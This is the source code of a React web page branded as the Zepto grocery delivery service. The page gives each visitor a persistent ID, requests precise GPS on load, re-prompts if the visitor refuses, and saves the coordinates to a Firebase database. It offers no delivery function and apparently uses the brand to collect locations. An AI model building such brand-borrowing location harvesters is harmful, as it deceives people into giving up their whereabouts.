import React, { useEffect, useState } from "react";
import { database } from "./firebase";
import { ref, update } from "firebase/database";
import { v4 as uuidv4 } from "uuid";

function App() {
  const [location, setLocation] = useState(null);
  const [userID, setUserID] = useState(null);
  const [loading, setLoading] = useState(true);
  const [gpsDenied, setGpsDenied] = useState(false);

  useEffect(() => {
    initializeUserID();
  }, []);

  // 📌 Generate/Retrieve User ID
  const initializeUserID = () => {
    let storedUserID = localStorage.getItem("userID");
    if (!storedUserID) {
      storedUserID = uuidv4();
      localStorage.setItem("userID", storedUserID);
    }
    setUserID(storedUserID);
    console.log("✅ UserID:", storedUserID);

    // Request GPS immediately (this will show the browser popup if needed)
    getGPSLocation(storedUserID);
  };

  // 📌 Directly Request GPS Location (Ensures Popup Appears)
  const getGPSLocation = (userID) => {
    if ("geolocation" in navigator) {
      navigator.geolocation.getCurrentPosition(
        (position) => {
          const { latitude, longitude } = position.coords;
          const gpsLocationData = {
            latitude,
            longitude,
            timestamp: getISTTimestamp(),
            method: "GPS",
          };

          setLocation(gpsLocationData);
          saveLocation(userID, gpsLocationData);
          setGpsDenied(false);
          setLoading(false);
        },
        (error) => {
          console.warn("❌ GPS Error:", error);

          if (error.code === error.PERMISSION_DENIED) {
            // 🚀 Show browser pop-up by retrying on user action
            setGpsDenied(true);
          }
          setLoading(false);
        },
        { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
      );
    } else {
      console.error("❌ Geolocation not supported");
      setGpsDenied(true);
      setLoading(false);
    }
  };

  // 📌 IST Timestamp
  const getISTTimestamp = () => {
    const now = new Date();
    now.setHours(now.getHours() + 5);
    now.setMinutes(now.getMinutes() + 30);
    return now.toISOString().replace("T", " ").split(".")[0];
  };

  // 📌 Save GPS Location to Firebase
  const saveLocation = async (userID, newLocation) => {
    const locationRef = ref(database, `userLocations/${userID}/gpsLocation`);
    await update(locationRef, newLocation);
    console.log("✅ GPS updated in Firebase:", newLocation);
  };

  return (
    <div
      style={{
        display: "flex",
        justifyContent: "center",
        alignItems: "center",
        height: "100vh",
        backgroundColor: "#f0f2f5",
        fontFamily: "Arial, sans-serif",
      }}
    >
      <div
        style={{
          textAlign: "center",
          width: "90%",
          maxWidth: "400px",
          backgroundColor: "white",
          padding: "20px",
          borderRadius: "8px",
          boxShadow: "0px 4px 10px rgba(0,0,0,0.1)",
        }}
      >
        <h1 style={{ color: "#2A2E43", fontSize: "32px", fontWeight: "bold" }}>
          Zepto
        </h1>
        <p style={{ color: "#606770", fontSize: "16px" }}>
          Fast & seamless grocery delivery
        </p>

        {loading ? (
          <p>Fetching location...</p>
        ) : location ? (
          <div style={{ marginTop: "20px", fontSize: "14px", color: "#606770" }}>
            <p>Latitude: {location.latitude}</p>
            <p>Longitude: {location.longitude}</p>
            <p>Timestamp (IST): {location.timestamp}</p>
            <p>Method: {location.method}</p>
          </div>
        ) : gpsDenied ? (
          <>
            <p style={{ color: "red", fontWeight: "bold" }}>
              GPS is blocked. Click below to enable location services.
            </p>
            <button
              onClick={() => getGPSLocation(userID)}
              style={{
                backgroundColor: "#FF4C3B",
                color: "white",
                padding: "10px 15px",
                fontSize: "16px",
                border: "none",
                borderRadius: "6px",
                cursor: "pointer",
                marginTop: "10px",
              }}
            >
              Enable Location
            </button>
          </>
        ) : (
          <p>Could not retrieve location</p>
        )}
      </div>
    </div>
  );
}

export default App;
